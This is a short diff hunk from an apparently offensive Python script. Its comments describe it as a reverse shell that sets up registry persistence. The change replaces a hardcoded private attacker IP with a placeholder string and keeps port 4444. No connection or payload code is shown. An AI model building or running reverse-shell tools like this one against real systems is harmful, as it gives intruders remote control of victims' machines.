@@ -7,7 +7,7 @@ import shutil
 import time
 
 # Configuration for the reverse shell
-ATTACKER_IP = '192.168.1.177'
+ATTACKER_IP = 'ip address of attacker'
 ATTACKER_PORT = 4444
 
 # Name for the registry entry
